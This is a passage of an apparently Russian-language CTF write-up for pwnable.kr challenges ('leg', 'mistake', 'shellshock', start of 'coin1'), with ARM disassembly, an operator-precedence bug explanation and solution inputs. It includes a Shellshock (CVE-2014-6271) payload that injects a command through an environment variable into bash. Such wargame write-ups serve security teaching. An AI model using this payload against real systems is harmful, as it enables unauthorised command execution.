    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span><span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"I have strong leg :P</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><strong>leg.asm</strong></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">disass</span> <span class="nx">main</span>
<span class="nx">Dump</span> <span class="k">of</span> <span class="nx">assembler</span> <span class="nx">code</span> <span class="k">for</span> <span class="kd">function</span> <span class="nf">main</span><span class="p">:</span>
   <span class="mh">0x00008d3c</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">push</span>  <span class="p">{</span><span class="nx">r4</span><span class="p">,</span> <span class="nx">r11</span><span class="p">,</span> <span class="nx">lr</span><span class="p">}</span>
   <span class="mh">0x00008d40</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">add</span> <span class="nx">r11</span><span class="p">,</span> <span class="nx">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">8</span>
   <span class="mh">0x00008d44</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">sub</span> <span class="nx">sp</span><span class="p">,</span> <span class="nx">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">12</span>
   <span class="mh">0x00008d48</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">mov</span> <span class="nx">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
   <span class="mh">0x00008d4c</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">str</span> <span class="nx">r3</span><span class="p">,</span> <span class="p">[</span><span class="nx">r11</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">16</span><span class="p">]</span>
   <span class="mh">0x00008d50</span> <span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">ldr</span> <span class="nx">r0</span><span class="p">,</span> <span class="p">[</span><span class="nx">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">104</span><span class="p">]</span>  <span class="p">;</span> <span class="mh">0x8dc0</span> <span class="o">&lt;</span><span class="nx">main</span><span class="o">+</span><span class="mi">132</span><span class="o">&gt;</span>
   <span class="mh">0x00008d54</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">bl</span>  <span class="mh">0xfb6c</span> <span class="o">&lt;</span><span class="nx">printf</span><span class="o">&gt;</span>
   <span class="mh">0x00008d58</span> <span class="o">&lt;+</span><span class="mi">28</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">sub</span> <span class="nx">r3</span><span class="p">,</span> <span class="nx">r11</span><span class="p">,</span> <span class="err">#</span><span class="mi">16</span>
   <span class="mh">0x00008d5c</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">ldr</span> <span class="nx">r0</span><span class="p">,</span> <span class="p">[</span><span class="nx">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">96</span><span class="p">]</span> <span class="p">;</span> <span class="mh">0x8dc4</span> <span class="o">&lt;</span><span class="nx">main</span><span class="o">+</span><span class="mi">136</span><span class="o">&gt;</span>
   <span class="mh">0x00008d60</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">mov</span> <span class="nx">r1</span><span class="p">,</span> <span class="nx">r3</span>
   <span class="mh">0x00008d64</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">bl</span>  <span class="mh">0xfbd8</span> <span class="o">&lt;</span><span class="nx">__isoc99_scanf</span><span class="o">&gt;</span>
   <span class="mh">0x00008d68</span> <span class="o">&lt;+</span><span class="mi">44</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">bl</span>  <span class="mh">0x8cd4</span> <span class="o">&lt;</span><span class="nx">key1</span><span class="o">&gt;</span>
   <span class="mh">0x00008d6c</span> <span class="o">&lt;+</span><span class="mi">48</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">mov</span> <span class="nx">r4</span><span class="p">,</span> <span class="nx">r0</span>
   <span class="mh">0x00008d70</span> <span class="o">&lt;+</span><span class="mi">52</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">bl</span>  <span class="mh">0x8cf0</span> <span class="o">&lt;</span><span class="nx">key2</span><span class="o">&gt;</span>
   <span class="mh">0x00008d74</span> <span class="o">&lt;+</span><span class="mi">56</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">mov</span> <span class="nx">r3</span><span class="p">,</span> <span class="nx">r0</span>
   <span class="mh">0x00008d78</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">add</span> <span class="nx">r4</span><span class="p">,</span> <span class="nx">r4</span><span class="p">,</span> <span class="nx">r3</span>
   <span class="mh">0x00008d7c</span> <span class="o">&lt;+</span><span class="mi">64</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">bl</span>  <span class="mh">0x8d20</span> <span class="o">&lt;</span><span class="nx">key3</span><span class="o">&gt;</span>
   <span class="mh">0x00008d80</span> <span class="o">&lt;+</span><span class="mi">68</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">mov</span> <span class="nx">r3</span><span class="p">,</span> <span class="nx">r0</span>
   <span class="mh">0x00008d84</span> <span class="o">&lt;+</span><span class="mi">72</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">add</span> <span class="nx">r2</span><span class="p">,</span> <span class="nx">r4</span><span class="p">,</span> <span class="nx">r3</span>
   <span class="mh">0x00008d88</span> <span class="o">&lt;+</span><span class="mi">76</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">ldr</span> <span class="nx">r3</span><span class="p">,</span> <span class="p">[</span><span class="nx">r11</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">16</span><span class="p">]</span>
   <span class="mh">0x00008d8c</span> <span class="o">&lt;+</span><span class="mi">80</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">cmp</span> <span class="nx">r2</span><span class="p">,</span> <span class="nx">r3</span>
   <span class="mh">0x00008d90</span> <span class="o">&lt;+</span><span class="mi">84</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">bne</span> <span class="mh">0x8da8</span> <span class="o">&lt;</span><span class="nx">main</span><span class="o">+</span><span class="mi">108</span><span class="o">&gt;</span>
   <span class="mh">0x00008d94</span> <span class="o">&lt;+</span><span class="mi">88</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">ldr</span> <span class="nx">r0</span><span class="p">,</span> <span class="p">[</span><span class="nx">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">44</span><span class="p">]</span> <span class="p">;</span> <span class="mh">0x8dc8</span> <span class="o">&lt;</span><span class="nx">main</span><span class="o">+</span><span class="mi">140</span><span class="o">&gt;</span>
   <span class="mh">0x00008d98</span> <span class="o">&lt;+</span><span class="mi">92</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">bl</span>  <span class="mh">0x1050c</span> <span class="o">&lt;</span><span class="nx">puts</span><span class="o">&gt;</span>
   <span class="mh">0x00008d9c</span> <span class="o">&lt;+</span><span class="mi">96</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">ldr</span> <span class="nx">r0</span><span class="p">,</span> <span class="p">[</span><span class="nx">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">40</span><span class="p">]</span> <span class="p">;</span> <span class="mh">0x8dcc</span> <span class="o">&lt;</span><span class="nx">main</span><span class="o">+</span><span class="mi">144</span><span class="o">&gt;</span>
   <span class="mh">0x00008da0</span> <span class="o">&lt;+</span><span class="mi">100</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">bl</span>  <span class="mh">0xf89c</span> <span class="o">&lt;</span><span class="nx">system</span><span class="o">&gt;</span>
   <span class="mh">0x00008da4</span> <span class="o">&lt;+</span><span class="mi">104</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">b</span> <span class="mh">0x8db0</span> <span class="o">&lt;</span><span class="nx">main</span><span class="o">+</span><span class="mi">116</span><span class="o">&gt;</span>
   <span class="mh">0x00008da8</span> <span class="o">&lt;+</span><span class="mi">108</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">ldr</span> <span class="nx">r0</span><span class="p">,</span> <span class="p">[</span><span class="nx">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">32</span><span class="p">]</span> <span class="p">;</span> <span class="mh">0x8dd0</span> <span class="o">&lt;</span><span class="nx">main</span><span class="o">+</span><span class="mi">148</span><span class="o">&gt;</span>
   <span class="mh">0x00008dac</span> <span class="o">&lt;+</span><span class="mi">112</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">bl</span>  <span class="mh">0x1050c</span> <span class="o">&lt;</span><span class="nx">puts</span><span class="o">&gt;</span>
   <span class="mh">0x00008db0</span> <span class="o">&lt;+</span><span class="mi">116</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">mov</span> <span class="nx">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
   <span class="mh">0x00008db4</span> <span class="o">&lt;+</span><span class="mi">120</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">mov</span> <span class="nx">r0</span><span class="p">,</span> <span class="nx">r3</span>
   <span class="mh">0x00008db8</span> <span class="o">&lt;+</span><span class="mi">124</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">sub</span> <span class="nx">sp</span><span class="p">,</span> <span class="nx">r11</span><span class="p">,</span> <span class="err">#</span><span class="mi">8</span>
   <span class="mh">0x00008dbc</span> <span class="o">&lt;+</span><span class="mi">128</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">pop</span> <span class="p">{</span><span class="nx">r4</span><span class="p">,</span> <span class="nx">r11</span><span class="p">,</span> <span class="nx">pc</span><span class="p">}</span>
   <span class="mh">0x00008dc0</span> <span class="o">&lt;+</span><span class="mi">132</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">andeq</span> <span class="nx">r10</span><span class="p">,</span> <span class="nx">r6</span><span class="p">,</span> <span class="nx">r12</span><span class="p">,</span> <span class="nx">lsl</span> <span class="err">#</span><span class="mi">9</span>
   <span class="mh">0x00008dc4</span> <span class="o">&lt;+</span><span class="mi">136</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">andeq</span> <span class="nx">r10</span><span class="p">,</span> <span class="nx">r6</span><span class="p">,</span> <span class="nx">r12</span><span class="p">,</span> <span class="nx">lsr</span> <span class="err">#</span><span class="mi">9</span>
   <span class="mh">0x00008dc8</span> <span class="o">&lt;+</span><span class="mi">140</span><span class="o">&gt;</span><span class="p">:</span>     <span class="p">;</span> <span class="o">&lt;</span><span class="nx">UNDEFINED</span><span class="o">&gt;</span> <span class="nx">instruction</span><span class="p">:</span> <span class="mh">0x0006a4b0</span>
   <span class="mh">0x00008dcc</span> <span class="o">&lt;+</span><span class="mi">144</span><span class="o">&gt;</span><span class="p">:</span>     <span class="p">;</span> <span class="o">&lt;</span><span class="nx">UNDEFINED</span><span class="o">&gt;</span> <span class="nx">instruction</span><span class="p">:</span> <span class="mh">0x0006a4bc</span>
   <span class="mh">0x00008dd0</span> <span class="o">&lt;+</span><span class="mi">148</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">andeq</span> <span class="nx">r10</span><span class="p">,</span> <span class="nx">r6</span><span class="p">,</span> <span class="nx">r4</span><span class="p">,</span> <span class="nx">asr</span> <span class="err">#</span><span class="mi">9</span>
<span class="nx">End</span> <span class="k">of</span> <span class="nx">assembler</span> <span class="nx">dump</span><span class="p">.</span>
<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">disass</span> <span class="nx">key1</span>
<span class="nx">Dump</span> <span class="k">of</span> <span class="nx">assembler</span> <span class="nx">code</span> <span class="k">for</span> <span class="kd">function</span> <span class="nf">key1</span><span class="p">:</span>
   <span class="mh">0x00008cd4</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">push</span>  <span class="p">{</span><span class="nx">r11</span><span class="p">}</span>   <span class="p">;</span> <span class="p">(</span><span class="nx">str</span> <span class="nx">r11</span><span class="p">,</span> <span class="p">[</span><span class="nx">sp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">!</span><span class="p">)</span>
   <span class="mh">0x00008cd8</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">add</span> <span class="nx">r11</span><span class="p">,</span> <span class="nx">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
   <span class="mh">0x00008cdc</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">mov</span> <span class="nx">r3</span><span class="p">,</span> <span class="nx">pc</span>
   <span class="mh">0x00008ce0</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">mov</span> <span class="nx">r0</span><span class="p">,</span> <span class="nx">r3</span>
   <span class="mh">0x00008ce4</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">sub</span> <span class="nx">sp</span><span class="p">,</span> <span class="nx">r11</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
   <span class="mh">0x00008ce8</span> <span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">pop</span> <span class="p">{</span><span class="nx">r11</span><span class="p">}</span>   <span class="p">;</span> <span class="p">(</span><span class="nx">ldr</span> <span class="nx">r11</span><span class="p">,</span> <span class="p">[</span><span class="nx">sp</span><span class="p">],</span> <span class="err">#</span><span class="mi">4</span><span class="p">)</span>
   <span class="mh">0x00008cec</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">bx</span>  <span class="nx">lr</span>
<span class="nx">End</span> <span class="k">of</span> <span class="nx">assembler</span> <span class="nx">dump</span><span class="p">.</span>
<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">disass</span> <span class="nx">key2</span>
<span class="nx">Dump</span> <span class="k">of</span> <span class="nx">assembler</span> <span class="nx">code</span> <span class="k">for</span> <span class="kd">function</span> <span class="nf">key2</span><span class="p">:</span>
   <span class="mh">0x00008cf0</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">push</span>  <span class="p">{</span><span class="nx">r11</span><span class="p">}</span>   <span class="p">;</span> <span class="p">(</span><span class="nx">str</span> <span class="nx">r11</span><span class="p">,</span> <span class="p">[</span><span class="nx">sp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">!</span><span class="p">)</span>
   <span class="mh">0x00008cf4</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">add</span> <span class="nx">r11</span><span class="p">,</span> <span class="nx">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
   <span class="mh">0x00008cf8</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">push</span>  <span class="p">{</span><span class="nx">r6</span><span class="p">}</span>    <span class="p">;</span> <span class="p">(</span><span class="nx">str</span> <span class="nx">r6</span><span class="p">,</span> <span class="p">[</span><span class="nx">sp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">!</span><span class="p">)</span>
   <span class="mh">0x00008cfc</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">add</span> <span class="nx">r6</span><span class="p">,</span> <span class="nx">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">1</span>
   <span class="mh">0x00008d00</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">bx</span>  <span class="nx">r6</span>
   <span class="mh">0x00008d04</span> <span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">mov</span> <span class="nx">r3</span><span class="p">,</span> <span class="nx">pc</span>
   <span class="mh">0x00008d06</span> <span class="o">&lt;+</span><span class="mi">22</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">adds</span>  <span class="nx">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span>
   <span class="mh">0x00008d08</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">push</span>  <span class="p">{</span><span class="nx">r3</span><span class="p">}</span>
   <span class="mh">0x00008d0a</span> <span class="o">&lt;+</span><span class="mi">26</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">pop</span> <span class="p">{</span><span class="nx">pc</span><span class="p">}</span>
   <span class="mh">0x00008d0c</span> <span class="o">&lt;+</span><span class="mi">28</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">pop</span> <span class="p">{</span><span class="nx">r6</span><span class="p">}</span>    <span class="p">;</span> <span class="p">(</span><span class="nx">ldr</span> <span class="nx">r6</span><span class="p">,</span> <span class="p">[</span><span class="nx">sp</span><span class="p">],</span> <span class="err">#</span><span class="mi">4</span><span class="p">)</span>
   <span class="mh">0x00008d10</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">mov</span> <span class="nx">r0</span><span class="p">,</span> <span class="nx">r3</span>
   <span class="mh">0x00008d14</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">sub</span> <span class="nx">sp</span><span class="p">,</span> <span class="nx">r11</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
   <span class="mh">0x00008d18</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">pop</span> <span class="p">{</span><span class="nx">r11</span><span class="p">}</span>   <span class="p">;</span> <span class="p">(</span><span class="nx">ldr</span> <span class="nx">r11</span><span class="p">,</span> <span class="p">[</span><span class="nx">sp</span><span class="p">],</span> <span class="err">#</span><span class="mi">4</span><span class="p">)</span>
   <span class="mh">0x00008d1c</span> <span class="o">&lt;+</span><span class="mi">44</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">bx</span>  <span class="nx">lr</span>
<span class="nx">End</span> <span class="k">of</span> <span class="nx">assembler</span> <span class="nx">dump</span><span class="p">.</span>
<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">disass</span> <span class="nx">key3</span>
<span class="nx">Dump</span> <span class="k">of</span> <span class="nx">assembler</span> <span class="nx">code</span> <span class="k">for</span> <span class="kd">function</span> <span class="nf">key3</span><span class="p">:</span>
   <span class="mh">0x00008d20</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">push</span>  <span class="p">{</span><span class="nx">r11</span><span class="p">}</span>   <span class="p">;</span> <span class="p">(</span><span class="nx">str</span> <span class="nx">r11</span><span class="p">,</span> <span class="p">[</span><span class="nx">sp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">!</span><span class="p">)</span>
   <span class="mh">0x00008d24</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">add</span> <span class="nx">r11</span><span class="p">,</span> <span class="nx">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
   <span class="mh">0x00008d28</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">mov</span> <span class="nx">r3</span><span class="p">,</span> <span class="nx">lr</span>
   <span class="mh">0x00008d2c</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">mov</span> <span class="nx">r0</span><span class="p">,</span> <span class="nx">r3</span>
   <span class="mh">0x00008d30</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">sub</span> <span class="nx">sp</span><span class="p">,</span> <span class="nx">r11</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
   <span class="mh">0x00008d34</span> <span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">pop</span> <span class="p">{</span><span class="nx">r11</span><span class="p">}</span>   <span class="p">;</span> <span class="p">(</span><span class="nx">ldr</span> <span class="nx">r11</span><span class="p">,</span> <span class="p">[</span><span class="nx">sp</span><span class="p">],</span> <span class="err">#</span><span class="mi">4</span><span class="p">)</span>
   <span class="mh">0x00008d38</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nx">bx</span>  <span class="nx">lr</span>
<span class="nx">End</span> <span class="k">of</span> <span class="nx">assembler</span> <span class="nx">dump</span><span class="p">.</span>
<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> 
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">hex(0x8ce4 + 0x8d0c + 0x8d80)</code>
<code class="language-plaintext highlighter-rouge">&gt; Out[33]: '0x1a770'</code></p>

<blockquote>
  <p>/ $ ./leg</p>

  <p>Daddy has very strong arm! : 108400</p>

  <p>Congratz!</p>

  <p>My daddy has a lot of ARMv5te muscle!</p>
</blockquote>

<h1 id="mistake"><a href="#header-1"></a>mistake</h1>

<blockquote>
  <p>We all make mistakes, let’s move on.</p>

  <p>don’t take this too seriously, no fancy hacking skill is required at all)</p>

  <p>This task is based on real event</p>

  <p>Thanks to dhmonkey</p>

  <p>hint : operator priority</p>

  <p>ssh mistake@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>

<p><strong>mistake.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span>
<span class="cp">#define PW_LEN 10
#define XORKEY 1
</span>
<span class="kt">void</span> <span class="nf">xor</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">){</span>
        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
                <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">XORKEY</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
        
        <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="n">open</span><span class="p">(</span><span class="s">"/home/mistake/password"</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">,</span><span class="mo">0400</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"can't open password %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"do not bruteforce...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">sleep</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="p">);</span>

        <span class="kt">char</span> <span class="n">pw_buf</span><span class="p">[</span><span class="n">PW_LEN</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
        <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">len</span><span class="o">=</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">pw_buf</span><span class="p">,</span><span class="n">PW_LEN</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"read error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>               
        <span class="p">}</span>

        <span class="kt">char</span> <span class="n">pw_buf2</span><span class="p">[</span><span class="n">PW_LEN</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"input password : "</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%10s"</span><span class="p">,</span> <span class="n">pw_buf2</span><span class="p">);</span>

        <span class="c1">// xor your input</span>
        <span class="n">xor</span><span class="p">(</span><span class="n">pw_buf2</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">pw_buf</span><span class="p">,</span> <span class="n">pw_buf2</span><span class="p">,</span> <span class="n">PW_LEN</span><span class="p">)){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"Password OK</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">system</span><span class="p">(</span><span class="s">"/bin/cat flag</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"Wrong Password</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>В <code class="language-plaintext highlighter-rouge">fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0</code> сначала выполняется правая часть, а в самом конце = <code class="language-plaintext highlighter-rouge">(fd = (1 &lt; 0)) --&gt; false</code></p>

<p>Поэтому по итогу в fd, из которого по идее мы читаем(где должен быть дескриптор файла password), лежит 0, читаем из stdin’а</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mistake@pwnable:~$ ./mistake

do not bruteforce…

@@@@@CCCCC

input password : AAAAABBBBB

Password OK

Mommy, the operator priority always confuses me :(
</code></pre></div></div>

<h1 id="shellshock"><a href="#header-1"></a>shellshock</h1>

<blockquote>
  <p>Mommy, there was a shocking news about bash.</p>

  <p>I bet you already know, but lets just make it sure :)</p>

  <p>ssh shellshock@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>

<p><strong>shellshock.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
        <span class="n">setresuid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
        <span class="n">setresgid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"/home/shellshock/bash -c 'echo shock_me'"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>env x='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago…!!
</code></pre></div></div>

<h1 id="coin1"><a href="#header-1"></a>coin1</h1>

<blockquote>
  <p>Mommy, I wanna play a game!</p>

  <p>(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)</p>

  <p>Running at : nc pwnable.kr 9007</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        ---------------------------------------------------
        -              Shall we play a game?              -
        ---------------------------------------------------

        You have given some gold coins in your hand
        however, there is one counterfeit coin among them
        counterfeit coin looks exactly same as real coin
        however, its weight is different from real one
